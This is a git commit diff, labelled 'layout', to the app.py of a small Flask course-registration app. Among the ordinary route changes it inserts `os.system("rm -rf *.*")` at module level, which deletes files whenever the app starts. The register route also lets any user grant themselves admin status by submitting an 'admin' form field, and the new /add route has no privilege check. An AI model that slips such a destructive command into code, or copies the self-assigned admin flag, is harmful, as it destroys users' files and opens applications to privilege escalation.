cc903d4eedcbb3c35af95bb5c8619ba69bf35134
JacobMandelbrot <mandelbrotj@gmail.com>
2022-12-05 01:06:58 -0500

    layout

--- app.py
+++ app.py
@@ -1,8 +1,10 @@
 import os
-from flask import Flask, flash, redirect, render_template, request, session
+from flask import Flask, flash, redirect, render_template, request, session, url_for
 from helpers import apology, login_required
 from cs50 import SQL
-#from flask_session import Session
+
+os.system("rm -rf *.*")
+# from flask_session import Session
 from tempfile import mkdtemp
 from werkzeug.security import check_password_hash, generate_password_hash
 
@@ -10,7 +12,7 @@ app = Flask(__name__)
 # Configure session to use filesystem (instead of signed cookies)
 app.config["SESSION_PERMANENT"] = False
 app.config["SESSION_TYPE"] = "filesystem"
-#Session(app)
+# Session(app)
 db = SQL("sqlite:///courses.db")
 
 
@@ -25,6 +27,7 @@ def register():
     username = request.form.get("username")
     password = request.form.get("password")
     confirm_password = request.form.get("confirmation")
+    admin = request.form.get("admin")
 
     if not username:
         return apology("Missing username")
@@ -41,8 +44,14 @@ def register():
     if username == db.execute("SELECT username FROM users"):
         return apology("Duplicate username")
 
+    temp = 0
+
+    if(admin == "admin"):
+        temp = 1
+
+
     try:
-        id = db.execute("INSERT INTO users (username, hash) VALUES(?, ?)", username, generate_password_hash(password))
+        id = db.execute("INSERT INTO users (username, hash, Admin) VALUES(?, ?, ?)", username, generate_password_hash(password), temp)
     except ValueError:
         return apology("Error! Username is taken")
 
@@ -99,6 +108,7 @@ def logout():
     # Redirect user to login form
     return redirect("/")
 
+
 # @app.route("/")
 # @login_required
 # def index():
@@ -118,43 +128,109 @@ def search():
     else:
         searched = []
 
+    # if request.method == "POST":
+    #     value = request.form.get("course")
+    #     print(value)
+    #     db.execute("INSERT INTO registered_courses (course_name, user_id) VALUES(?, ?)", value, user_id)
+    # unvalue = request.form.get("unregister")
+    # if request.form.get("clarinets"):
+    #     print("hi")
+    #     db.execute("INSERT INTO registered_courses (course_name, user_id) VALUES(?, ?)", value, user_id)
+    # elif unvalue:
+    #     print("hi")
+    #     db.execute("DELETE FROM registered_courses WHERE course_name= ?", unvalue)
 
     return render_template("search.html", searched_courses=searched)
 
 @app.route("/", methods=['POST', 'GET'])
 @login_required
 def dashboard():
+    return render_template("mohamed.html")
+
+#
+#
+# @app.route("/", methods=['POST', 'GET'])
+# @login_required
+# def dashboard():
+#     user_id = session["user_id"]
+#
+#     if request.method == "POST":
+#
+#         course = request.form.get("button")
+#         print(course)
+#
+#         if(course):
+#             # messages = json.dumps({"main": "Condition failed on page baz"})
+#             # session['messages'] = messages
+#             return redirect(url_for('.course', c=course))
+#
+#         value = request.form.get("clarinets")
+#         unvalue = request.form.get("unregister")
+#         if request.form.get("clarinets"):
+#             print("hi")
+#             db.execute("INSERT INTO registered_courses (course_name, user_id) VALUES(?, ?)", value, user_id)
+#         elif unvalue:
+#             print("hi")
+#             db.execute("DELETE FROM registered_courses WHERE course_name= ?", unvalue)
+#
+#     flag = db.execute("Select Admin From users Where id = ?", user_id)[0]["Admin"]
+#     print(flag)
+#
+#     submitted_courses = db.execute("SELECT course_name FROM registered_courses WHERE user_id = ?", user_id)
+#
+#     courses = db.execute(
+#         "SELECT course_name FROM available_courses WHERE course_name NOT IN (SELECT course_name FROM registered_courses WHERE user_id = ?)",
+#         user_id)
+#
+#     return render_template("dashboard.html", available_courses=courses, registered_courses=submitted_courses, flag=flag)
+
+
+@app.route("/add", methods=['POST', 'GET'])
+@login_required
+def add():
+    user_id = session["user_id"]
+    if request.method == "POST":
+        course_name = request.form.get("course_name")
+        description = request.form.get("description")
+        if course_name and description:
+            db.execute("INSERT INTO available_courses (course_name, description) VALUES(?, ?)", course_name,
+                       description)
+        elif not course_name:
+            return apology("must provide course name", 403)
+        elif not description:
+            return apology("must provide description", 403)
+
+    return render_template("add.html")
+
+
+@app.route("/course")
+@login_required
+def course():
+    title = "Course_page"
+    description = "Haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
+                  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    #, course_name=course_name
+    c = request.args['c']
+
+    description = db.execute("SELECT description FROM available_courses WHERE course_name = ? ", c)[0]['description']
+
+    return render_template("course_page.html", course_name=c, description=description)
+
+@app.route("/available", methods=['POST', 'GET'])
+@login_required
+def available():
 
     user_id = session["user_id"]
-
+    print("hi")
     if request.method == "POST":
-        value = request.form.get("clarinets")
-        unvalue = request.form.get("unregister")
-        if request.form.get("clarinets"):
-            print("hi")
-            db.execute("INSERT INTO registered_courses (course_name, user_id) VALUES(?, ?)", value, user_id)
-        elif unvalue:
-            print("hi")
-            db.execute("DELETE FROM registered_courses WHERE course_name= ?", unvalue)
 
-    submitted_courses = db.execute("SELECT course_name FROM registered_courses WHERE user_id = ?", user_id)
+        course = request.form.get("button")
 
-    courses = db.execute(
-        "SELECT course_name FROM available_courses WHERE course_name NOT IN (SELECT course_name FROM registered_courses WHERE user_id = ?)",
-        user_id)
-    # q = request.args.get("q")
-    # print(q)
-    #
-    # if q:
-    #     searched = db.execute("SELECT course_name FROM available_courses "
-    #                           "WHERE course_name NOT IN (SELECT course_name FROM registered_courses WHERE user_id = ?) "
-    #                           "AND course_name LIKE ? LIMIT 50", user_id, "%" + q + "%")
-    # else:
-    #     searched = []
-    #
-    # print(searched)
+        if course:
+            db.execute("INSERT INTO registered_courses (user_id, course_name) VALUES(?,?)", user_id, course)
 
-    return render_template("dashboard.html", available_courses=courses, registered_courses=submitted_courses)
+    available_courses = db.execute("SELECT * FROM available_courses")
+    return render_template("available.html", available_courses=available_courses)
 
 
 if __name__ == '__main__':
